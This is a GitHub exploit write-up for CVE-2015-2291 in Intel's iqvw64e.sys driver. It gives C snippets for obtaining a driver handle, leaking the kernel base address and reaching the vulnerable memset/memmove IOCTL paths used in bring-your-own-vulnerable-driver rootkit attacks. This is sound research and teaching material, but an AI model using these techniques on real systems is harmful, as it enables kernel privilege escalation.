# CVE-2015-2291
 (1) IQVW32.sys before 1.3.1.0 and (2) IQVW64.sys before 1.3.1.0 in the Intel Ethernet diagnostics driver for Windows allows local users to cause a denial of service or possibly execute arbitrary code with kernel privileges via a crafted (a) 0x80862013, (b) 0x8086200B, (c) 0x8086200F, or (d) 0x80862007 IOCTL call.

# Overview
 This repository contains a write-up of the vulnerability in question, along with proof-of-concept exploits functional on 64-bit Windows 7 SP1 and Windows 10 20H2. The driver file can be located in the [Driver Files](https://github.com/Exploitables/CVE-2015-2291/tree/main/Driver%20Files) directory.

# Motivation
 The motivation behind writing an exploit for this device driver in particular is solely because it is currently being abused in the wild to load an attacker's unsigned root-kit. Using the BYOVD (Bring Your Own Vulnerable Driver) method, malware can check if it is running with elevated privileges, drop a copy of the vulnerable device driver, load the driver, and subsequently exploit it to gain kernel code execution to load the root-kit. I was unable to successfully reverse engineer the malware sample , so I took it upon myself to create the exploit.
 
 Samples spotted in the wild:
 https://bazaar.abuse.ch/sample/84ed7fec67de5621806dbb43af5167a5fc60ab7f2403448519dc0eca2b8f9022/
 https://bazaar.abuse.ch/sample/0925b8985b19d7925d68186d666b0050a4cb3f2a577d64765d770a57a2eab9ae/
 https://bazaar.abuse.ch/sample/e8b7f42d544fe8b954c4021315cff2fdd44d67d11704009cdf3037d34e0c0a93/
 
# CVE-2015-2291 - An Exploit's Technical Analysis
 The device driver, namely `iqvw64e.sys`, is a driver designed to perform network adapter diagnostics. It allows the user-mode component to interact with the device driver to perform a plethora of kernel routines by exposing a few [IO control codes](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/introduction-to-i-o-control-codes) (also known as IOCTLs), with a "sub" IO control code provided in the user's input buffer during the interaction. The IO control code that will be used to hit the vulnerable code-path is `0x80862007`. In addition the primary control code, the aforementioned "sub" IO control codes that will be covered in this analysis will be the `0x33` code to hit the `memmove` function call, and the `0x30` code to hit the `memset` function call code-paths. This write-up will not be covering any details regarding the `DriverEntry` routine, as there is enough documentation on [Microsoft's Documentation page](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_initialize) to give you a thorough explanation.
 
 To start, we want to know how we can interact with this particular device driver in the first place. The most common means of communicating with a device driver is through the usage of a function named [DeviceIoControl](https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol). The general idea behind this function is that we can pass a valid driver handle created by [CreateFileA](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea), pass in an IO control code that corresponds to the kernel routine we want, pass in a structure (or buffer) that it is expecting, and it will return data in our output buffer. While routines like these can be at times necessary (e.g. accessing [model-specific registers](https://en.wikipedia.org/wiki/Model-specific_register) for overclocking purposes), they also pose a serious risk to security. But... how?
 
 In the case of CVE-2015-2291, the vulnerability can be triggered by an unprivileged user. Because there are no santization checks present, and administrator privileges are *not* required to exploit the vulnerability, this poses a security risk. What lies underneath these two flaws, is the ability to fully control the `memset` and the `memmove` function calls exposed by the IO control code interface. Remember the aforementioned function `DeviceIoControl` from before, how we're able to pass in a structure that will be used in a kernel routine? This is how it all comes together.
 
 Let's take a step back. We first want to obtain the driver handle that is related to the vulnerable device driver. Even before this though, we need to locate the correlating [named device object](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/named-device-objects). These are exposed to user-space by a symbolic link (commonly hard-coded), which can be found using [WinObj](https://docs.microsoft.com/en-us/sysinternals/downloads/winobj), part of the [SysInternals suite]. While we could use a string dumping utility to dump the symbolic link, or alternatively reverse engineer the device driver, I simply loaded the device driver and located it using WinObj. To obtain the driver handle, we need to call the `CreateFileA` function and have it return a valid driver handle for us to use later in the process. The code for this process is as follows:
```C
if (h_nal == (HANDLE)-1)
	{
		printf("\n[-] Unable to obtain a driver handle to the Nal device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a driver handle to the Nal device driver. Handle Value: 0x%p", h_nal);
```

 We will be using the driver handle later in the exploitation process. For now, we will begin the preparation of our exploit. The next step would be to load the `ntdll.dll` library using the [LoadLibraryA](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) function to return a [module handle](https://docs.microsoft.com/en-us/windows/win32/winprog/windows-data-types), so we can dynamically locate the functions we need. While the `ntdll.dll` library may already be loaded into our process, we nonetheless need to obtain a handle to the library that we can use. The functions that we need for exploitation are [NtQuerySystemInformation](https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation) to leak the base address of the NT Kernel (with medium process integrity) for later in the exploitation process, and the [NtQueryIntervalProfile](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FProfile%2FNtQueryIntervalProfile.html) function to trigger the vulnerability. As for the code to load the `ntdll.dll` library, it is as follows:
```C
h_ntdll = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
	if (!h_ntdll)
	{
		printf("\n[-] Failed to load the \"ntdll.dll\" API library. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 0;
	}
	printf("\n[+] Loaded the \"ntdll.dll\" API library. Handle Value: 0x%p", h_ntdll);
```

 Now that we have obtained a handle to the library, we will start off by locating the `NtQueryIntervalProfile` function. To start, we will need a type definition for this function, as it is undocumented. While you can find the type definition online, I have provided it here for easier access:
```C
typedef unsigned int(__stdcall* NtQueryIntervalProfile)(
	unsigned int      ProfileSource,
	PULONG            Interval
	);
```

 To use this function, we will also need to declare a variable (local or global, up to you) using the `NtQueryIntervalProfile` type. Now, how do we turn this variable into an actual function? To do this, we will be using a function named [GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress). By passing in a handle to the module we want to search (the first parameter) and passing in the name of the function (the second parameter), we can locate any function we want in the module and retrieve a pointer to that function! Code is provided to help you process this information.
```C
_NtQueryIntervalProfile = (NtQueryIntervalProfile)GetProcAddress(h_ntdll, "NtQueryIntervalProfile");
	if (!_NtQueryIntervalProfile)
	{
		printf("\n[-] Failed to locate the \"NtQueryIntervalProfile\" function. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Located the \"NtQueryIntervalProfile\" function. Function Address: 0x%p", _NtQueryIntervalProfile);
```

 The reason why dynamically loading functions and the ability to use them works is because functions themselves are pointers to executable code. The actual body of a function is the code that will be executed.
 
 Now that we have resolved the `NtQueryIntervalProfile` function pointer, we still need to retrieve the address of the `NtQuerySystemInformation` function. Likewise before, we need a type definition for this function, and we will also need to declare a variable for the function to call it. Also as before, I have provided the type definition for ease of access.
```C
typedef NTSTATUS(WINAPI* NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);
```

 And, likewise before, we need to locate the function. The only difference between the previous call to `GetProcAddress` and this one is the function we are searching for. We can copy the function and change the second parameter to search for our second function. After the code is written, we should have something similar to this:
```C
_NtQuerySystemInformation = (NtQuerySystemInformation)GetProcAddress(h_ntdll, "NtQuerySystemInformation");
	if (!_NtQuerySystemInformation)
	{
		printf("\n[-] Failed to locate the \"NtQuerySystemInformation\" function. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 0;
	}
	printf("\n[+] Located the \"NtQuerySystemInformation\" function. Function Address: 0x%p", _NtQuerySystemInformation);
```

 Perfect! We have located all of the nonpresent functions we need. Now, we will need to leak the NT Kernel base address. With the help of `NtQuerySystemInformation`, we can create a query that will return the base addresses and other information of all of the currently loaded device drivers. The first parameter of the `NtQuerySystemInformation` function is an enum, specifically one that is not publicly documented. The enum is `SystemModuleInformation`, which has a corresponding value of `0xB`. Then, we will need to pass a pointer to one of the returned structures. The necessary structures and enums are provided below, courtesy of [FuzzySecurity (@b33f)](https://github.com/FuzzySecurity):
```C
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 0xB,
} SYSTEM_INFORMATION_CLASS;

typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
	ULONG				 Reserved3;
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 LoadCount;
	WORD                 NameOffset;
	CHAR                 Name[256];
} SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;
```

 But wait, there is more to it! We will need to specify the size of the structure to allocate. Because the size of the structure varies depending on the number of device drivers to retrieve information about, we need to call this function twice; the first function call will be to retrieve the expected size of the structure, and the second function call will be to retrieve information and store it into our structure. To retrieve the size, use the aforementioned `SystemModuleInformation` enum for the first parameter, pass a pointer to a variable that will store the size of the structure, and pass in `0` (or `NULL`) for the rest of the left-over parameters. The code should look like this:
```C
_NtQuerySystemInformation(SystemModuleInformation, 0, 0, &return_length);
```

 Easy enough! We have successfully retrieved the size of the expected structure. Now, we need to allocate memory for our variable that will store the information. Using a functio named [VirtualAlloc](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc), we can allocate stack memory at any address we provide, with any size we want, with our own set of protections, and return a pointer to this memory. For our purposes, we do not need to allocate this memory at a fixed address, so we will pass in `0` to allow the memory manager to choose a location in memory for us. Additionally, we will also need to allocate a block of stack memory with the size returned by `NtQuerySystemInformation`, which is why we had to store the value. As for the allocation type and the protection parameters, simply use the generic arguments shown in the code below.
```C
module_info = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(0, return_length, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
```

 Now that we have allocated our stack memory for the returned structure, we can now query the system module information, and retrieve a structure containing information of every loaded device driver. To do this, we can reuse our function call to `NtQuerySystemInformation` from before, and pass in a pointer to the structure (second parameter) and the size of the structure (third parameter). Now, do you have something like this?
```C
status = _NtQuerySystemInformation(SystemModuleInformation, module_info, return_length, &return_length);
	if (status)
	{
		printf("\n[-] Failed to query system module information. NTSTATUS: %d (0x%x)", status, status);
		unused = getchar();
		return 0;
	}
	printf("\n[+] Queried system module information.");
```

 Well, I would hope you have something similar. All we have left to do to leak the NT Kernel base address, is by querying our structure! You do not have to compare strings against the driver's name in this case, as the NT Kernel driver information is always at index `0` in this structure. To retrieve the base address of a driver, simply print, store, or return the value of the `ImageBaseAddress` structure field. It is also good practice to ensure that the pointer is not `NULL` prior to using it.
```C
if (module_info)
	{
		printf("\n[+] Leaked the NT kernel base address. Kernel Base Address: 0x%p", module_info->Modules[0].ImageBaseAddress);
		return (unsigned long long)module_info->Modules[0].ImageBaseAddress;
	}

	printf("\n[-] Failed to leak the NT kernel base address.");
	unused = getchar();
	return 0;
```

 We have successfully returned the kernel base address. Now, there is one more step before we begin the exploitation process of this vulnerability. We will need to create a `QWORD` (a 64-bit integer) pointer that will store our [PTE (page table entry)](https://en.wikipedia.org/wiki/Page_table) and allocate stack memory for it using `VirtualAlloc`. The PTEs will be covered later in this paper.
 
 As demonstrated earlier, we will use `VirtualAlloc` to allocate memory and return a pointer to the block of memory. The code used in my exploit is shown below:
```C
pte_address = (long long*)VirtualAlloc(0, 8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!pte_address)
	{
		printf("\n[-] Failed to allocate stack memory for the leaked page table entry base address pointer. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated stack memory for the leaked page table entry base address pointer. Stack Memory Address: 0x%p", (long long*)pte_address);
```

 Now that the last step of the set up process is finished, let's begin the exploitation process!
 
 As mentioned in the earlier parts of the paper, the IO control code that we want to use is IOCTL `0x80862007`. But, how do we pass in the "sub" IOCTLs?

![Proof of our input buffer being stored in rcx](https://github.com/Exploitables/CVE-2015-2291/blob/main/Figures/InputBuffer%20rcx.png)
 
 A pointer to our user-land input that we pass to the device driver is stored in the `rcx` register. As we can see in this figure, we noticed that it is simply dereferencing the value at the first `QWORD` value in the structure that we will pass in. Then, it performs a switch-case on the value obtained.

![Proof of our input buffer being stored in rcx](https://github.com/Exploitables/CVE-2015-2291/blob/main/Figures/InputBuffer%20rcx%202.png)
 
 Scrolling through the decompiled psuedo-code, we find two routines that allow us to control all three values of `memset` and `memove` respectively. By passing in a value of `0x30` as the first `QWORD` in the structure, we can hit the `memset` code-path. Alternatively, by passing in a value of `0x33` as the first `QWORD` in the structure, we hit the `memmove` code-path instead. These two code-paths are depicted below respectively.

![Proof of memset control](https://github.com/Exploitables/CVE-2015-2291/blob/main/Figures/Memset%20code%20path.png)
![Proof of memmove control](https://github.com/Exploitables/CVE-2015-2291/blob/main/Figures/Memmove%20code%20path.png)

